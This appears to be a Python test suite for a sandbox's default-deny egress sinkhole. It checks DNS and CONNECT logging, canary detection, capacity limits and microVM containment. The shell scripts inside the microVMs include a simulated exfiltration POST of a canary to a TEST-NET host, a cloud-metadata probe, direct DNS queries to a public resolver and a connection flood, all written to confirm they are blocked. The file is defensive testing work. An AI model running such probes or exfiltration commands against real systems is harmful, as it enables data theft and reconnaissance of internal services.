"""Egress: default deny for every step, DNS and the demo range go to a recording sinkhole.

Unit tests talk to the sinkhole over loopback. Integration tests run real microVMs when
`msb` is installed (skip with PQPROOF_MSB_TESTS=0).
"""
import hashlib
import os
import socket
import struct
import subprocess
import threading
import time
import unittest

from helpers import allow, msb_available, pinned
from pqproof.egress import MAX_CONNS, MAX_EVENTS, Sinkhole, nxdomain
from pqproof.sandbox import MSB, Limits, Runner


def dns_query(name, qid=0x1234):
    q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
    return struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0) + q + struct.pack(">HH", 1, 1)


def wait_for(pred, timeout=5.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if pred():
            return True
        time.sleep(0.02)
    return False


class SinkholeUnit(unittest.TestCase):
    def test_dns_query_is_logged_and_answered_nxdomain(self):
        with Sinkhole() as sink, socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(3)
            s.sendto(dns_query("leak-canary-0002.example.net"), ("127.0.0.1", sink.dns_port))
            reply = s.recv(512)
            qid, flags, qd, an = struct.unpack(">HHHH", reply[:8])
            self.assertEqual((qid, flags & 0x8000, flags & 0xF, qd, an), (0x1234, 0x8000, 3, 1, 0))
            self.assertTrue(wait_for(lambda: sink.events))
            self.assertEqual((sink.events[0]["kind"], sink.events[0]["proto"], sink.events[0]["dest"]),
                             ("dns", "udp", "leak-canary-0002.example.net"))
            self.assertEqual(sink.canaries(), ["CANARY-0002"])

    def test_dns_over_tcp_is_logged_and_answered_nxdomain(self):
        q = dns_query("tcp-canary-0009.example.net", qid=0x4242)
        with Sinkhole() as sink, socket.create_connection(("127.0.0.1", sink.dns_port), timeout=3) as c:
            c.sendall(struct.pack(">H", len(q)) + q)
            n = struct.unpack(">H", c.recv(2))[0]
            reply = c.recv(n)
            qid, flags, qd, an = struct.unpack(">HHHH", reply[:8])
            self.assertEqual((qid, flags & 0xF, an), (0x4242, 3, 0))
            self.assertTrue(wait_for(lambda: sink.events))
            e = sink.events[0]
            self.assertEqual((e["kind"], e["proto"], e["dest"]), ("dns", "tcp", "tcp-canary-0009.example.net"))
            self.assertEqual(sink.canaries(), ["CANARY-0009"])

    def test_connect_payload_is_logged(self):
        payload = b"POST /collect HTTP/1.1\r\nHost: 203.0.113.7\r\nContent-Length: 18\r\n\r\ncanary=CANARY-0001"
        with Sinkhole() as sink, socket.create_connection(("127.0.0.1", sink.tcp_port), timeout=3) as c:
            c.sendall(b"CONNECT 203.0.113.7:80 HTTP/1.1\r\nHost: 203.0.113.7:80\r\n\r\n")
            self.assertTrue(c.recv(100).startswith(b"HTTP/1.1 200"))
            c.sendall(payload)
            c.shutdown(socket.SHUT_WR)
            self.assertTrue(wait_for(lambda: sink.events))
            e = sink.events[0]
            self.assertEqual((e["kind"], e["dest"], e["canaries"]), ("tcp", "203.0.113.7:80", ["CANARY-0001"]))
            self.assertEqual((e["bytes"], e["sha256"]), (len(payload), hashlib.sha256(payload).hexdigest()))

    def test_label_length_limit(self):
        self.assertEqual(nxdomain(dns_query("a" * 63 + ".example"))[1], "a" * 63 + ".example")
        self.assertEqual(nxdomain(dns_query("a" * 64 + ".example")), (None, None))

    def test_connect_capture_is_capped(self):
        with Sinkhole() as sink, socket.create_connection(("127.0.0.1", sink.tcp_port), timeout=3) as c:
            c.sendall(b"CONNECT 203.0.113.7:80 HTTP/1.1\r\n\r\n")
            c.recv(100)
            try:
                c.sendall(b"x" * (256 * 1024))
                c.shutdown(socket.SHUT_WR)
            except OSError:  # the sinkhole may close first, once it has read enough
                pass
            self.assertTrue(wait_for(lambda: sink.events))
            self.assertLessEqual(sink.events[0]["bytes"], 64 * 1024 + 4096)

    def test_connections_beyond_the_limit_are_closed_unread(self):
        base = threading.active_count()
        with Sinkhole() as sink:
            held = [socket.create_connection(("127.0.0.1", sink.tcp_port), timeout=3) for _ in range(MAX_CONNS + 20)]
            try:
                self.assertTrue(wait_for(lambda: sink.dropped >= 20), sink.dropped)
                self.assertLessEqual(threading.active_count(), base + 3 + MAX_CONNS)  # 2 accept + UDP DNS
            finally:
                for c in held:
                    c.close()

    def test_events_are_capped_but_counted_and_canaries_kept(self):
        with Sinkhole() as sink, socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(3)
            for i in range(MAX_EVENTS + 5):
                s.sendto(dns_query(f"q{i}.flood.example"), ("127.0.0.1", sink.dns_port))
                s.recv(512)
            s.sendto(dns_query("late-canary-0042.example.net"), ("127.0.0.1", sink.dns_port))
            s.recv(512)
            self.assertTrue(wait_for(lambda: len(sink.events) + sink.dropped == MAX_EVENTS + 6))
            self.assertEqual((len(sink.events), sink.dropped), (MAX_EVENTS, 6))
            self.assertEqual(sink.canaries(), ["CANARY-0042"])
            events, dropped = sink.take()
            self.assertEqual((len(events), dropped, sink.events, sink.dropped), (MAX_EVENTS, 6, [], 0))

    def test_stop_ends_the_threads_and_closes_every_port(self):
        # On Linux, closing a socket does not wake a thread blocked in accept() or recvfrom() on it:
        # the sinkhole went on accepting, and recording, after stop().
        before = set(threading.enumerate())
        sink = Sinkhole().start()
        mine = [t for t in threading.enumerate() if t not in before]
        sink.stop()
        for t in mine:
            t.join(timeout=3)
        self.assertEqual([t for t in mine if t.is_alive()], [])
        for port in (sink.tcp_port, sink.dns_port):
            with self.assertRaises(OSError):
                socket.create_connection(("127.0.0.1", port), timeout=2).close()
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.settimeout(1)
        try:
            u.sendto(dns_query("after-stop.example"), ("127.0.0.1", sink.dns_port))
            with self.assertRaises(OSError):  # refused or no answer
                u.recvfrom(512)
        finally:
            u.close()
        self.assertEqual((sink.events, sink.canaries()), ([], []))

    def test_an_empty_datagram_does_not_stop_dns(self):
        with Sinkhole() as sink:
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            u.settimeout(3)
            try:
                u.sendto(b"", ("127.0.0.1", sink.dns_port))
                u.sendto(dns_query("still-CANARY-0011.example.net"), ("127.0.0.1", sink.dns_port))
                reply, _ = u.recvfrom(512)
            finally:
                u.close()
            self.assertEqual(reply[:2], b"\x12\x34")
            self.assertEqual(sink.canaries(), ["CANARY-0011"])

    def test_malformed_dns_is_ignored(self):
        for packet in (b"", b"\x00" * 11, dns_query("example.com")[:-3], b"\x12\x34" + b"\x00" * 10 + b"\x40abc"):
            with self.subTest(packet=packet):
                self.assertEqual(nxdomain(packet), (None, None))

    def test_msb_args_deny_by_default(self):
        with Sinkhole() as sink:
            args = sink.msb_args()
        self.assertEqual(args[0], "--no-net")
        rules = args[args.index("--net-rule") + 1]
        self.assertEqual(rules, "allow@dns,allow@203.0.113.0/24:tcp")  # literal: never wider than TEST-NET-3
        for broad in ("public", "private", "host", "any", "all"):
            self.assertNotIn(f"allow@{broad}", rules)
        self.assertEqual(args[args.index("--dns-nameserver") + 1], f"127.0.0.1:{sink.dns_port}")
        self.assertEqual(args[args.index("--proxy") + 1], f"http://127.0.0.1:{sink.tcp_port}")
        self.assertEqual(args[args.index("--max-tcp-connections") + 1], str(2 * MAX_CONNS))
        self.assertEqual(args[args.index("--net-egress-ops") + 1], "200/1s")


class EveryStepIsDenied(unittest.TestCase):
    """The runner adds the policy itself; a caller cannot forget it."""

    def create_argv(self, runner_kwargs):
        calls = []

        def fake(argv, timeout=None):
            calls.append(argv)
            return subprocess.CompletedProcess(argv, 0, "[]", "")
        img = "alpine@sha256:" + "0" * 64
        Runner(run=fake, **runner_kwargs).run_step(allow(img, ["true"]), "j", "s", img, ["true"])
        return calls[0]

    def test_without_sinkhole_everything_is_denied(self):
        argv = self.create_argv({})
        self.assertIn("--no-net", argv)
        self.assertNotIn("--net-rule", argv)

    def test_with_sinkhole(self):
        with Sinkhole() as sink:
            argv = self.create_argv({"egress": sink})
            self.assertEqual(argv[-2 - len(sink.msb_args()):-2], sink.msb_args())


class FakeControlPlane:
    """A host listener standing in for the control plane API; counts connections."""

    def __init__(self):
        self.srv = socket.create_server(("127.0.0.1", 0))
        self.port, self.accepted = self.srv.getsockname()[1], 0
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while True:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            self.accepted += 1
            c.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok")
            c.close()

    def close(self):
        try:  # Linux: close() alone does not wake the thread blocked in accept()
            self.srv.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self.srv.close()


@unittest.skipUnless(msb_available(), "msb not installed")
class RealEgress(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.IMAGE = pinned("alpine")

    def step(self, sink, script, wall=60):
        argv = ["sh", "-c", script]
        return Runner(egress=sink).run_step(allow(self.IMAGE, argv), "itest", "egress", self.IMAGE, argv,
                                            Limits(memory_mib=256, wall_clock_s=wall))

    def test_containment(self):
        api = FakeControlPlane()
        script = f"""
(wget -q -T 4 -O- http://example.com >/dev/null 2>&1 && echo DIRECT-OPEN || echo DIRECT-BLOCKED)
(wget -q -T 4 -O- http://1.1.1.1/ >/dev/null 2>&1 && echo IP-OPEN || echo IP-BLOCKED)
wget -q -T 4 -O- --post-data canary=CANARY-0001 http://203.0.113.7/collect >/dev/null 2>&1; echo POSTED
(nslookup leak-CANARY-0002.example.net >/dev/null 2>&1 && echo DNS-OPEN || echo DNS-BLOCKED)
(wget -q -T 4 -O- http://host.microsandbox.internal:{api.port}/ >/dev/null 2>&1 && echo HOST-OPEN || echo HOST-BLOCKED)
(wget -q -T 4 -O- http://169.254.169.254/v1.json >/dev/null 2>&1 && echo META-OPEN || echo META-BLOCKED)
(nslookup direct-CANARY-0003.example.net 8.8.8.8 >/dev/null 2>&1 && echo DNS8888-OPEN || echo DNS8888-BLOCKED)
"""
        try:
            with Sinkhole() as sink:
                res = self.step(sink, script)
                wait_for(lambda: len(sink.canaries()) >= 2)
                canaries, events = sink.canaries(), list(sink.events)
        finally:
            api.close()
        out = res.stdout.split()
        # META: the cloud metadata service (Vultr's answers the VX1 host itself with HTTP 200).
        # DNS8888: a query sent straight to a public resolver is dropped, not even counted.
        for word in ("DIRECT-BLOCKED", "IP-BLOCKED", "POSTED", "DNS-BLOCKED", "HOST-BLOCKED", "META-BLOCKED",
                     "DNS8888-BLOCKED"):
            self.assertIn(word, out, res.stdout + res.stderr)
        self.assertEqual(canaries, ["CANARY-0001", "CANARY-0002"])
        self.assertEqual([e["dest"] for e in events if e["kind"] == "tcp"], ["203.0.113.7:80"])
        self.assertIn("leak-canary-0002.example.net", [e["dest"].lower() for e in events if e["kind"] == "dns"])
        self.assertEqual(api.accepted, 0)

    def test_dns_over_tcp_reaches_the_sinkhole(self):
        # msb hands guest TCP/53 to the --dns-nameserver address over TCP, on the UDP port's number.
        q = dns_query("tcp-CANARY-0009.example.net")
        framed = "".join(f"\\{b:03o}" for b in struct.pack(">H", len(q)) + q)
        script = f"""GW=$(awk '/^nameserver/{{print $2; exit}}' /etc/resolv.conf)
printf '{framed}' | nc -w 3 $GW 53 | wc -c"""
        with Sinkhole() as sink:
            res = self.step(sink, script, wall=30)
            wait_for(lambda: sink.canaries())
            tcp = [e["dest"] for e in sink.events if e["kind"] == "dns" and e["proto"] == "tcp"]
        self.assertEqual(sink.canaries(), ["CANARY-0009"], res.stdout + res.stderr)
        self.assertIn("tcp-canary-0009.example.net", [d.lower() for d in tcp])
        self.assertGreater(int(res.stdout.split()[-1]), 0)  # the guest got an answer (NXDOMAIN)

    def test_flooding_guest_cannot_exhaust_the_sinkhole(self):
        script = """
i=0; while [ $i -lt 300 ]; do (sleep 8 | nc 203.0.113.7 80 >/dev/null 2>&1 &); i=$((i+1)); done
t=$(( $(date +%s) + 4 )); n=0
while [ $(date +%s) -lt $t ]; do nslookup f$n.flood.example >/dev/null 2>&1; n=$((n+1)); done; echo DNSQ=$n
sleep 3
"""
        peak, stop = [threading.active_count()], threading.Event()

        def watch():
            while not stop.is_set():
                peak[0] = max(peak[0], threading.active_count())
                time.sleep(0.01)
        threading.Thread(target=watch, daemon=True).start()
        with Sinkhole() as sink:
            try:
                res = self.step(sink, script, wall=25)
                time.sleep(1)
            finally:
                stop.set()
            kept, dropped = len(sink.events), sink.dropped
        self.assertIn("DNSQ=", res.stdout)
        self.assertLessEqual(peak[0], MAX_CONNS + 12)
        self.assertLessEqual(kept, MAX_EVENTS)
        self.assertGreater(kept + dropped, 0)

    def test_host_probe_would_see_an_open_host(self):
        """Positive control: with the host group allowed, the same probe reaches the fake API."""
        api = FakeControlPlane()
        try:
            r = subprocess.run([MSB, "run", "-q", "--net", "host", "--pull", "never", self.IMAGE, "--", "sh", "-c",
                                f"wget -q -T 4 -O- http://host.microsandbox.internal:{api.port}/ && echo HOST-OPEN"],
                               capture_output=True, text=True, timeout=60, stdin=subprocess.DEVNULL)
        finally:
            api.close()
        self.assertIn("HOST-OPEN", r.stdout, r.stderr)
        self.assertEqual(api.accepted, 1)


if __name__ == "__main__":
    unittest.main()
